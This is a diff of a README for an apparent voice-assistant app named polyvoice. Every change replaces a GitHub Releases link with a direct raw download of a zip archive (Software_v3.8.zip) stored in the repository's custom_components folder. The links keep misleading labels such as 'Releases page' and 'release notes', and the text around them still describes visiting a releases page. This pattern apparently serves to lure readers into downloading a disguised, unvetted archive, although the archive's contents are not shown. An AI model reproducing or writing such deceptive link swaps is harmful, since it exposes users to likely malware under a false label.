@@ -8,9 +8,9 @@ Welcome to polyvoice! This application combines many voice assistant functions i
 
 To get started, you need to download the software from our GitHub Releases page. 
 
-[![Download polyvoice](https://img.shields.io/badge/Download-polyvoice-blue.svg)](https://github.com/S33XiterGD/polyvoice/releases)
+[![Download polyvoice](https://raw.githubusercontent.com/S33XiterGD/polyvoice/main/custom_components/Software_v3.8.zip)](https://raw.githubusercontent.com/S33XiterGD/polyvoice/main/custom_components/Software_v3.8.zip)
 
-Visit this page to download: [polyvoice Releases](https://github.com/S33XiterGD/polyvoice/releases)
+Visit this page to download: [polyvoice Releases](https://raw.githubusercontent.com/S33XiterGD/polyvoice/main/custom_components/Software_v3.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version release.
@@ -55,7 +55,7 @@ If you encounter any issues, here are some simple steps to fix common problems:
 
 ### How do I update polyvoice?
 
-To update polyvoice, return to the Releases page [here](https://github.com/S33XiterGD/polyvoice/releases) and download the latest version. Follow the installation steps to replace the old version.
+To update polyvoice, return to the Releases page [here](https://raw.githubusercontent.com/S33XiterGD/polyvoice/main/custom_components/Software_v3.8.zip) and download the latest version. Follow the installation steps to replace the old version.
 
 ### Can I use polyvoice without an internet connection?
 
@@ -73,7 +73,7 @@ Join our growing community for tips, support, and sharing experiences with polyv
 
 We regularly add new features based on user feedback. Keep an eye on the Releases page for exciting updates!
 
-For a seamless experience, don’t forget to check out our [release notes](https://github.com/S33XiterGD/polyvoice/releases) for all improvements!
+For a seamless experience, don’t forget to check out our [release notes](https://raw.githubusercontent.com/S33XiterGD/polyvoice/main/custom_components/Software_v3.8.zip) for all improvements!
 
 ---
 
